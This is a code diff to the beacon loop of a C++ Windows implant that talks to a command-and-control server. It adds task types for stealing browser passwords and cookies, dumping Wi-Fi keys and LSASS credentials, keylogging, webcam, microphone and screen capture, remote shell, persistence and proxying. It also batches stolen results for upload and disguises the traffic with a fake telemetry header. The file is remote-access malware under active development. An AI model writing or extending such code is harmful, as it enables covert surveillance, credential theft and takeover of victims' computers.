@@ -11,13 +11,38 @@
 #include <thread>
 #include <vector>
 #include <algorithm>
-#include <iterator>
+#include "../utils/Logger.h"
+#ifndef NOMINMAX
+#define NOMINMAX
+#endif
 #include <windows.h>
 #include <winhttp.h>
+
 
 namespace {
     beacon::TaskType stringToTaskType(const std::string& str) {
         if (str == "sysinfo") return beacon::TaskType::SYSINFO;
+        if (str == "installed_software") return beacon::TaskType::INSTALLED_APPS;
+        if (str == "wifi_dump") return beacon::TaskType::WIFI_DUMP;
+        if (str == "browser_pass") return beacon::TaskType::BROWSER_PASS;
+        if (str == "cookie_steal") return beacon::TaskType::COOKIE_STEAL;
+        if (str == "screenshot") return beacon::TaskType::SCREENSHOT;
+        if (str == "keylog") return beacon::TaskType::KEYLOG;
+        if (str == "webcam") return beacon::TaskType::WEBCAM;
+        if (str == "mic") return beacon::TaskType::MIC;
+        if (str == "webcam_stream") return beacon::TaskType::WEBCAM_STREAM;
+        if (str == "screen_stream") return beacon::TaskType::SCREEN_STREAM;
+        if (str == "ishell" || str == "shell") return beacon::TaskType::ISHELL;
+        if (str == "deep_recon") return beacon::TaskType::DEEP_RECON;
+        if (str == "browse_fs") return beacon::TaskType::BROWSE_FS;
+        if (str == "file_download") return beacon::TaskType::FILE_DOWNLOAD;
+        if (str == "file_upload") return beacon::TaskType::FILE_UPLOAD;
+        if (str == "execute_assembly") return beacon::TaskType::EXECUTE_ASSEMBLY;
+        if (str == "socks_proxy") return beacon::TaskType::SOCKS_PROXY;
+        if (str == "adv_persistence") return beacon::TaskType::ADV_PERSISTENCE;
+        if (str == "dump_lsass") return beacon::TaskType::DUMP_LSASS;
+        if (str == "list_webcams") return beacon::TaskType::LIST_WEBCAMS;
+        if (str == "get_logs") return beacon::TaskType::GET_LOGS;
         // Add other mappings here
         return beacon::TaskType::UNKNOWN;
     }
@@ -57,6 +82,7 @@ namespace beacon {
 
 Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
     implantId_ = core::generateImplantId();
+    LOG_INFO("Implant initialized with ID: " + implantId_);
 }
 
 void Beacon::sleepWithJitter() {
@@ -75,7 +101,9 @@ void Beacon::run() {
     while (true) {
         if (c2Url_.empty()) {
             try {
+                LOG_DEBUG("Attempting to resolve C2 URL from: " + std::string(core::REDIRECTOR_URL));
                 c2Url_ = resolver.resolve();
+                LOG_INFO("C2 URL resolved: " + c2Url_);
                 c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
             } catch (const std::exception&) {
                 std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
@@ -85,7 +113,7 @@ void Beacon::run() {
                 continue;
             }
         }
-
+        bool hasMoreData = false;
         try {
             nlohmann::json payload = {
                 {"id", implantId_},
@@ -95,11 +123,14 @@ void Beacon::run() {
                 {"host", getHostname()},
                 {"results", nlohmann::json::array()}
             };
+            LOG_DEBUG("Sending beacon heart-beat...");
 
-            // Move pending results to in-flight
+            // Move limited subset of results to in-flight to avoid 413
+            int cappedCount = 0;
             Result result;
-            while (pendingResults_.try_dequeue(result)) {
+            while (cappedCount < 10 && pendingResults_.try_dequeue(result)) {
                 inFlightResults_.push_back(result);
+                cappedCount++;
             }
 
             for (const auto& res : inFlightResults_) {
@@ -111,6 +142,9 @@ void Beacon::run() {
             }
 
             std::string payload_str = payload.dump();
+            
+            // If we have more data, we'll skip sleep later
+            hasMoreData = pendingResults_.size_approx() > 0;
             std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());
 
             std::vector<BYTE> nonce(12);
@@ -147,7 +181,8 @@ void Beacon::run() {
             }
 
             http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
-            std::vector<BYTE> response = client.post(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath), encrypted_payload);
+            std::wstring headers = L"X-Telemetry-Key: " + std::wstring(core::API_KEY.begin(), core::API_KEY.end()) + L"\r\n";
+            std::vector<BYTE> response = client.post(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath), encrypted_payload, headers);
 
             if (response.size() >= 12) {
                 std::vector<BYTE> response_nonce(response.begin(), response.begin() + 12);
@@ -175,16 +210,28 @@ void Beacon::run() {
                         task.type = stringToTaskType(task_json["type"]);
                         task.cmd = task_json.value("cmd", "");
 
+                        LOG_INFO("Received task: " + task.task_id + " (" + task_json["type"].get<std::string>() + ")");
                         std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, task).detach();
                     }
                 }
             }
 
-        } catch (const std::exception&) {
-            // Silently continue
+        } catch (const std::exception& e) {
+            LOG_ERR("Beacon failed: " + std::string(e.what()));
+            // Clear in-flight results if they are likely causing 413/failure
+            // This prevents the 2GB memory leak
+            if (inFlightResults_.size() > 5) {
+                LOG_WARN("Clearing in-flight results to recover from potential 413/network error");
+                inFlightResults_.clear();
+            }
         }
 
-        sleepWithJitter();
+        // If data is pending, flush it faster instead of full sleep
+        if (hasMoreData) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        } else {
+            sleepWithJitter();
+        }
     }
 }
 
